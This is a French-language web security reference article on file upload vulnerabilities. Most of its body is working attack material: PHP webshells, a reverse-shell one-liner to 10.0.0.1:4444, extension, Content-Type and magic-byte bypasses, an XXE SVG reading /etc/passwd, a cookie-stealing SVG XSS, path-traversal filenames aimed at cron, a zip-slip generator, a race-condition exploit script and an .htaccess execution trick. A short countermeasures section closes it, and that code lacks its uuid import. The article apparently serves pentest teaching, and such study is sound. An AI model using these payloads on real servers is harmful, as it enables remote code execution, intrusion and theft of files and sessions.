---
title: File Upload Vulnerabilities
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [file-upload, rce, webshell, bypass, web, sécurité]
date: 2026-03-22
---

# File Upload Vulnerabilities

Les vulnérabilités d'upload de fichiers permettent à un attaquant de téléverser des fichiers non autorisés sur le serveur cible. Dans le meilleur cas pour l'attaquant, cela mène à l'exécution de code distant (RCE) via un webshell.

## Impact selon le contexte

| Scénario | Impact |
|---|---|
| Upload de webshell exécuté | RCE complet |
| Upload vers répertoire public | XSS stocké via SVG/HTML |
| Path traversal dans le nom | Écrasement de fichiers arbitraires |
| Upload de fichier ZIP | Zip slip → traversal lors de l'extraction |
| Taille illimitée | DoS (remplir le disque) |
| Type MIME non validé | Contenu indésirable |

## Webshell basique

```php
<?php system($_GET['cmd']); ?>
# Accès : https://site.com/uploads/shell.php?cmd=id
# Résultat : uid=33(www-data) gid=33(www-data)...

# Webshell plus complet
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}
?>

# Exécution en reverse shell
# ?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.0.1/4444+0>%261'
```

## Bypass des contrôles de type

### Bypass de l'extension

```
# Variantes d'extension PHP (selon la configuration Apache/Nginx)
shell.php
shell.php5
shell.php7
shell.phtml
shell.pht
shell.phps
shell.phar
shell.shtml        # SSI

# Double extension
shell.php.jpg      # Si le serveur strip la dernière extension
shell.jpg.php      # Parfois interprété comme PHP

# Null byte (applications héritées)
shell.php%00.jpg   # %00 = null byte, PHP 5.3 → tronque à shell.php

# Majuscules (Windows ou système insensible à la casse)
shell.PHP
shell.PhP
```

### Bypass du Content-Type

```
# Le navigateur envoie :
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← Modifier avec Burp : application/php → image/jpeg

# Le serveur vérifie uniquement le Content-Type → passe
# mais stocke un .php exécutable
```

### Bypass des magic bytes

Certaines validations lisent les premiers octets du fichier (magic bytes) pour identifier le type réel.

```
# JPEG magic bytes : FF D8 FF
# PNG : 89 50 4E 47 0D 0A 1A 0A

# Créer un fichier hybride (polyglot)
# Commencer par les magic bytes d'une image, puis injecter du PHP
printf '\xff\xd8\xff\xe0' > polyglot.php     # Magic JPEG
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php

# Ou avec exiftool (cacher le payload dans les métadonnées)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
cp image.jpg shell.jpg.php  # Si l'extension est acceptée
```

### Bypass via métadonnées (XXE dans SVG)

```xml
<!-- SVG est du XML → peut contenir des entités externes -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
<!-- Si le serveur render le SVG → XXE / lecture de fichiers -->
```

### HTML/SVG pour XSS stocké

```html
<!-- Uploader un fichier HTML ou SVG avec JavaScript -->
<!-- Si servi depuis le même domaine → XSS stocké -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
```

## Path Traversal dans le filename

```
# Si le serveur utilise le nom de fichier fourni par l'utilisateur
filename="../../../../var/www/html/shell.php"    # Remonter dans l'arborescence
filename="../../../etc/cron.d/backdoor"           # Écrire dans cron

# URL encodé
filename="..%2F..%2F..%2Fetc%2Fpasswd"

# Double encodage
filename="..%252F..%252F..%252Fetc%252Fpasswd"
```

## Zip Slip

```python
# Si le serveur extrait un ZIP uploadé sans vérifier les chemins
import zipfile

# Créer un ZIP malveillant
import os

def create_malicious_zip(zip_path, target_path, payload):
    with zipfile.ZipFile(zip_path, 'w') as zf:
        zf.writestr(zipfile.ZipInfo(target_path), payload)

create_malicious_zip(
    'malicious.zip',
    '../../../../var/www/html/shell.php',  # Path traversal dans le ZIP
    '<?php system($_GET["cmd"]); ?>'
)

# La victime extrait le ZIP → le fichier est écrit hors du répertoire cible
```

## Race Condition lors de l'upload

```
Certains serveurs :
1. Acceptent le fichier
2. L'analysent (antivirus, vérification)
3. Le suppriment si dangereux

Race condition : exécuter le fichier entre l'étape 1 et 3
```

```python
# Attaque en race condition
import requests, threading

def upload():
    with open('shell.php', 'rb') as f:
        requests.post('https://site.com/upload', files={'file': f},
                      cookies={'session': SESSION})

def execute():
    for _ in range(100):
        r = requests.get('https://site.com/uploads/shell.php?cmd=id',
                         cookies={'session': SESSION})
        if 'uid=' in r.text:
            print("SUCCESS:", r.text)
            return

t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=execute)
t1.start(); t2.start()
t1.join(); t2.join()
```

## Méthodologie de test

```
1. Upload normal → noter l'URL du fichier
2. Tester les extensions directement (shell.php, shell.php5...)
3. Tester Content-Type bypass (changer image/jpeg → garder .php)
4. Tester magic bytes
5. Tester double extension (shell.jpg.php, shell.php.jpg)
6. Tester null byte (shell.php%00.jpg)
7. Tester path traversal dans le filename
8. Tester un SVG/HTML pour XSS si PHP non permis
9. Vérifier si le répertoire d'upload est sous le docroot (accessible via navigateur)
10. Vérifier la configuration .htaccess (uploader un .htaccess custom)
```

```bash
# Uploader un .htaccess pour activer PHP sur les .jpg
echo "AddType application/x-httpd-php .jpg" > .htaccess
# Puis uploader un shell.jpg → exécuté comme PHP par Apache
```

## Contre-mesures

```python
import magic
import os
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
UPLOAD_FOLDER = '/var/uploads'  # Hors du document root

def validate_upload(file):
    # 1. Valider l'extension (liste blanche, jamais liste noire)
    filename = secure_filename(file.filename)  # Sanitize le nom
    ext = filename.rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError("Extension non autorisée")

    # 2. Valider les magic bytes (pas seulement le Content-Type)
    content = file.read()
    mime = magic.from_buffer(content, mime=True)
    if mime not in ('image/jpeg', 'image/png', 'image/gif'):
        raise ValueError("Type de fichier non autorisé")
    file.seek(0)

    # 3. Renommer le fichier (UUID) → évite path traversal et extension tricks
    new_filename = str(uuid.uuid4()) + '.' + ext

    # 4. Stocker hors du document root (pas accessible directement via HTTP)
    save_path = os.path.join(UPLOAD_FOLDER, new_filename)
    file.save(save_path)

    # 5. Servir via un endpoint dédié (pas d'accès direct)
    return new_filename

# 6. Configurer le serveur web pour ne PAS exécuter de scripts dans /uploads
# Nginx : location /uploads { add_header X-Content-Type-Options nosniff; }
# Apache : Options -ExecCGI, RemoveHandler .php .phtml
```
